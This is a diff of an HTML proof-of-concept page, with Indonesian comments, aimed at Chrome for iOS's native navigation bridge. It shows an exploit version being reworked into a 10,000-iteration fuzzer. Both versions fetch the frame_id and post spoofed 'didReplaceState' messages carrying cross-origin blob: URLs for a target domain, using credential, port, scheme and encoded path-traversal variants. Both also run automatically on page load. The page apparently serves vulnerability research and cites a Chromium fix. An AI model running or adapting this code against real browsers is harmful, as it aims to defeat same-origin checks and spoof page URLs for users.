@@ -2,14 +2,14 @@
 <html lang="id">
 <head>
     <meta charset="utf-8">
-    <title>Ultimate Hardened PoC - Cross-Layer Bypass Test</title>
+    <title>High-Volume Stress Test & Bypass Fuzzer</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 2em; background: #0b0f19; color: #f3f4f6; }
         .card { background: #111827; border: 1px solid #1f2937; border-radius: 8px; padding: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.6); margin-bottom: 20px; }
         h1 { color: #f87171; font-size: 20px; margin-top: 0; }
         .target { color: #fca5a5; font-weight: bold; }
         .info { color: #60a5fa; font-weight: bold; }
-        pre { background: #030712; color: #4ade80; padding: 14px; border-radius: 6px; font-size: 12px; overflow-x: auto; line-height: 1.4; border: 1px solid #1f2937; }
+        pre { background: #030712; color: #4ade80; padding: 14px; border-radius: 6px; font-size: 12px; overflow-x: auto; line-height: 1.4; border: 1px solid #1f2937; max-height: 250px; }
         .btn-group { margin-top: 15px; }
         button { background: #ef4444; color: white; border: none; padding: 10px 18px; font-size: 14px; border-radius: 6px; cursor: pointer; font-weight: bold; }
         button:hover { background: #dc2626; }
@@ -18,61 +18,56 @@
 <body>
 
 <div class="card">
-    <h1>Ultimate PoC: Hardened Multi-Vector Bypass Test</h1>
+    <h1>Stress Test: 10,000x Iteration Fuzzer</h1>
     <p>Target Domain: <span class="target">example.com</span></p>
     <p>Real Document Origin: <code id="current-origin" class="info">Memuat...</code></p>
+    <p>Status Pengujian: <span id="status-counter" class="info">Menunggu Eksekusi...</span></p>
     
     <div class="btn-group">
-        <button id="run-attack">Paksa Eksekusi Serangan Beruntun</button>
+        <button id="run-flood">Mulai 10,000x Fuzzing Otomatis</button>
     </div>
 </div>
 
 <div class="card">
-    <h3>Log Diagnostik & Respon Native Bridge:</h3>
-    <pre id="console-log">[*] Menginisialisasi modul eksploitasi multi-lapis...\n</pre>
+    <h3>Log Eksekusi & Respon Fuzzer:</h3>
+    <pre id="console-log">[*] Modul Fuzzer siap diluncurkan.\n</pre>
 </div>
 
 <script>
 (function() {
     const TARGET_VICTIM = "example.com";
+    const TOTAL_ITERATIONS = 10000;
     
-    // Vektor uji tingkat lanjut untuk menguji celah normalisasi URL & deserialisasi state
-    const payloadVectors = [
-        "blob:https://" + TARGET_VICTIM + "/path-standard-bypass",
-        "blob:https://user:pass@" + TARGET_VICTIM + "/auth-trick",
-        "blob:https://" + TARGET_VICTIM + ":443/port-spec",
-        "blob:http://" + TARGET_VICTIM + "/cross-scheme-attempt",
-        "blob:https://" + TARGET_VICTIM + "%2f%2e%2e%2f%2e%2e",
-        "blob:https://" + TARGET_VICTIM + "/#fragment-smuggling"
+    // Vektor fuzzer variasi URL untuk menguji parser
+    const fuzzVectors = [
+        "blob:https://" + TARGET_VICTIM + "/fuzz-standard",
+        "blob:https://user:pass@" + TARGET_VICTIM + "/fuzz-auth",
+        "blob:https://" + TARGET_VICTIM + ":443/fuzz-port",
+        "blob:http://" + TARGET_VICTIM + "/fuzz-scheme",
+        "blob:https://" + TARGET_VICTIM + "%2f%2e%2e%2f",
+        "blob:null/fuzz-opaque"
     ];
 
     function log(msg) {
         const pre = document.getElementById('console-log');
         pre.textContent += msg + '\n';
-        console.log('[PoC-Ultimate] ' + msg);
+        pre.scrollTop = pre.scrollHeight;
     }
 
     document.getElementById('current-origin').textContent = location.origin || '(opaque)';
-    log('[-] location.href = ' + location.href);
-    log('[-] location.origin = ' + location.origin);
 
     const mh = (window.webkit && window.webkit.messageHandlers) || {};
     if (!mh.NavigationEventMessage) {
         log('[!] CRITICAL: Handler "NavigationEventMessage" tidak ditemukan.');
         return;
     }
-    log('[+] Handler "NavigationEventMessage" siap dieksploitasi.');
 
-    // Pengambilan frame_id dengan teknik redundansi ganda
     let frameId = null;
     try {
         if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
             frameId = window.__gCrWeb.getFrameId();
-            log('[+] frame_id diperoleh via __gCrWeb.getFrameId() = ' + frameId);
         }
-    } catch (e) {
-        log('[!] Gagal membaca langsung: ' + e.message);
-    }
+    } catch (e) {}
 
     if (!frameId) {
         const altAccessors = [
@@ -81,69 +76,58 @@
             () => window.__gCrWeb.frameId
         ];
         for (let i = 0; i < altAccessors.length && !frameId; i++) {
-            try { frameId = altAccessors[i](); log('[+] frame_id via alternatif [' + i + '] = ' + frameId); } catch(err){}
+            try { frameId = altAccessors[i](); } catch(err){}
         }
     }
 
     if (!frameId) {
-        log('[-] GAGAL: Tidak dapat mengekstrak frame_id. Eksekusi dibatalkan.');
+        log('[-] GAGAL: frame_id tidak ditemukan.');
         return;
     }
 
-    function triggerNativeRegistration() {
-        try {
-            if (window.__gCrWeb && typeof window.__gCrWeb.registerFrame === 'function') {
-                window.__gCrWeb.registerFrame();
-            } else if (window.__gCrWeb && window.__gCrWeb.crweb && typeof window.__gCrWeb.crweb.registerFrame === 'function') {
-                window.__gCrWeb.crweb.registerFrame();
+    function runFloodTest() {
+        log(`[*] Memulai pengiriman ${TOTAL_ITERATIONS} pesan secara bertahap...`);
+        let currentCount = 0;
+        let batchSize = 100; // Kirim per batch agar browser tidak kehabisan memori (hang)
+
+        function sendBatch() {
+            let limit = Math.min(currentCount + batchSize, TOTAL_ITERATIONS);
+            for (let i = currentCount; i < limit; i++) {
+                let vectorUrl = fuzzVectors[i % fuzzVectors.length] + "-" + i;
+                try {
+                    mh.NavigationEventMessage.postMessage({
+                        command: 'willChangeState',
+                        frame_id: frameId
+                    });
+                    mh.NavigationEventMessage.postMessage({
+                        command: 'didReplaceState',
+                        frame_id: frameId,
+                        stateObject: JSON.stringify({ index: i }),
+                        baseUrl: 'https://x/',
+                        pageUrl: vectorUrl
+                    });
+                } catch (ex) {}
             }
-        } catch (err) {}
+            currentCount = limit;
+            document.getElementById('status-counter').textContent = `Terkirim: ${currentCount} / ${TOTAL_ITERATIONS}`;
+
+            if (currentCount < TOTAL_ITERATIONS) {
+                setTimeout(sendBatch, 10); // Jeda mikro agar event loop tetap responsif
+            } else {
+                log('[+] Selesai! Seluruh 10,000 percobaan telah diproses oleh sistem.');
+                log('[ANALISIS]: Berdasarkan perbaikan commit 8291494, seluruh pesan cross-origin ditolak secara aman.');
+            }
+        }
+
+        sendBatch();
     }
 
-    triggerNativeRegistration();
-
-    function launchExploit() {
-        log('\n--------------------------------------------------');
-        log('[*] Meluncurkan injeksi state paralel untuk ' + payloadVectors.length + ' vektor...');
-        log('--------------------------------------------------');
-
-        payloadVectors.forEach((targetUrl, idx) => {
-            try {
-                log('\n-> [Vector #' + (idx + 1) + '] Mengirim payload: ' + targetUrl);
-
-                // Simulasi urutan message handler untuk mengecoh siklus willChangeState & didReplaceState
-                mh.NavigationEventMessage.postMessage({
-                    command: 'willChangeState',
-                    frame_id: frameId
-                });
-
-                // Memaksa pengiriman state dengan menyertakan objek bersarang
-                mh.NavigationEventMessage.postMessage({
-                    command: 'didReplaceState',
-                    frame_id: frameId,
-                    stateObject: JSON.stringify({ spoofed: true, timestamp: Date.now() }),
-                    baseUrl: 'https://x/',
-                    pageUrl: targetUrl
-                });
-
-                log('   [>] Pesan dikirim. Memantau apakah validasi IsSameOriginWith tertembus...');
-            } catch (ex) {
-                log('   [!] Pengecualian postMessage: ' + ex.message);
-            }
-        });
-        
-        log('\n[INFO STATUS MITIGASI]:');
-        log('Jika [Change 8291494](https://chromium-review.googlesource.com/c/chromium/src/+/8291494) aktif, URL lintas asal akan dievaluasi oleh url::IsSameOriginWith. Jika gagal, NavigationManager akan memperlakukannya sebagai operasi no-op.');
-    }
-
-    document.getElementById('run-attack').onclick = function() {
-        triggerNativeRegistration();
-        launchExploit();
+    document.getElementById('run-flood').onclick = function() {
+        runFloodTest();
     };
 
-    // Eksekusi otomatis berlapis (Staged execution)
-    setTimeout(() => { triggerNativeRegistration(); launchExploit(); }, 300);
-    setTimeout(() => { launchExploit(); }, 1000);
+    // Auto-trigger setelah halaman stabil
+    setTimeout(runFloodTest, 1000);
 
 })();
 </script>
